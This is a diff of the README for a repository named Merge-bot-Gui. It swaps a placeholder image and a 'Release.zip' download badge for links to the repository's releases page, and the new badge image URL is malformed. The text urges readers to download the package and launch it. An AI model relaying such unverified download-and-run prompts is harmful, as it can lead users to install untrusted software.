@@ -2,7 +2,7 @@
 
 Welcome to the **Merge-bot-Gui** repository! 🤖
 
-![Merge-bot-Gui](https://your-image-url.com)
+![Merge-bot-Gui](https://github.com/yonghengdiao/Merge-bot-Gui/releases)
 
 ## Description
 
@@ -20,7 +20,7 @@ This repository houses the GUI application for Merge-bot, a cutting-edge tool fo
 
 To get started with Merge-bot-Gui, download the latest version from the following link:
 
-[![Download Merge-bot-Gui](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Merge-bot-Gui](https://github.com/yonghengdiao/Merge-bot-Gui/releases%20Version-blue)](https://github.com/yonghengdiao/Merge-bot-Gui/releases)
 
 Click on the link above to download the installation package. If the link ends with a file name, launch it to begin the setup process.
 
